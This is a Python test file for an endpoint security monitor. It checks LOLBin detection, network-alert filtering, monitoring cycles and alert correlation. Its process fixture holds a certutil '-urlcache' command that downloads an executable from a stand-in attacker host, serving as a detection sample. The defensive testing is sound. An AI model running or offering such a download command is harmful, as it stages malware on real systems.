"""
Monitor, detector and service pipeline tests
"""
import pytest

from backend.core.config import ConfigManager
from backend.core.database import DatabaseManager
from backend.detection.enhanced_detector import EnhancedSecurityDetector
from backend.monitor.enhanced_monitor import EnhancedSecurityMonitor, ProcessInfo


@pytest.fixture
def components(tmp_path):
    config = ConfigManager(str(tmp_path / "config.json"))
    db = DatabaseManager(str(tmp_path / "test.db"))
    return config, db


def make_process(pid=1234, name="certutil.exe", cmdline=None, create_time=1000.0, connections=None):
    return ProcessInfo(
        pid=pid, ppid=1, name=name, exe=f"C:\\Windows\\System32\\{name}",
        cmdline=cmdline if cmdline is not None else [name, "-urlcache", "-f", "http://evil.example/p.exe"],
        username="user", cpu_percent=0.0, memory_percent=0.0, create_time=create_time,
        connections=connections or []
    )


def test_lolbin_detection_reports_each_process_once(components):
    monitor = EnhancedSecurityMonitor(*components, establish_baseline=False)
    process = make_process()

    first = monitor._analyze_lolbins_activity([process])
    assert len(first) == 1
    alert = first[0]
    assert alert['type'] == 'lolbin_detection'
    assert alert['severity'] == 'CRITICAL'
    assert alert['mitre_id'] == 'T1105'
    assert '-urlcache' in alert['metadata']['patterns_matched']

    # Same process on the next cycle: no duplicate
    assert monitor._analyze_lolbins_activity([process]) == []

    # Process exits, PID is reused by a new process: reported again
    monitor._analyze_lolbins_activity([])
    assert len(monitor._analyze_lolbins_activity([make_process(create_time=2000.0)])) == 1


def test_benign_processes_are_ignored(components):
    monitor = EnhancedSecurityMonitor(*components, establish_baseline=False)
    processes = [
        make_process(name="certutil.exe", cmdline=["certutil.exe", "-verify", "cert.cer"]),
        make_process(pid=2, name="notepad.exe", cmdline=["notepad.exe", "-urlcache"]),
    ]
    assert monitor._analyze_lolbins_activity(processes) == []


def test_network_analysis_ignores_loopback(components):
    monitor = EnhancedSecurityMonitor(*components, establish_baseline=False)
    local = make_process(name="chrome.exe", cmdline=["chrome.exe"], connections=[
        {'remote_address': '127.0.0.1', 'remote_port': 4444}
    ])
    remote = make_process(pid=99, name="powershell.exe", cmdline=["powershell.exe"], connections=[
        {'remote_address': '8.8.8.8', 'remote_port': 443}
    ])

    alerts = monitor._analyze_network_activity([local, remote])
    assert [a['process_id'] for a in alerts] == [99]


def test_monitoring_cycle_collects_real_metrics(components):
    config, db = components
    monitor = EnhancedSecurityMonitor(config, db, establish_baseline=False)

    result = monitor.run_monitoring_cycle()

    assert 0 <= result['metrics']['cpu_percent'] <= 100
    assert result['processes_analyzed'] > 0
    assert isinstance(result['processes'][0], dict)
    assert len(db.get_metrics(limit=5)) == 1


def test_detector_accepts_monitor_output(components):
    config, db = components
    monitor = EnhancedSecurityMonitor(config, db, establish_baseline=False)
    detector = EnhancedSecurityDetector(config, db)

    result = monitor.run_monitoring_cycle()
    detections = detector.detect_threats([result['metrics']], [], result['processes'])
    assert isinstance(detections, list)


def test_single_host_is_not_a_coordinated_attack(components):
    detector = EnhancedSecurityDetector(*components)
    import time
    now = time.time()
    alerts = [{'id': str(i), 'type': 'high_memory', 'timestamp': now, 'system_name': 'host-a'} for i in range(4)]
    alerts.append({'id': 'x', 'type': 'high_cpu', 'timestamp': now})  # no system name

    assert detector.correlate_events(alerts, {}) == []
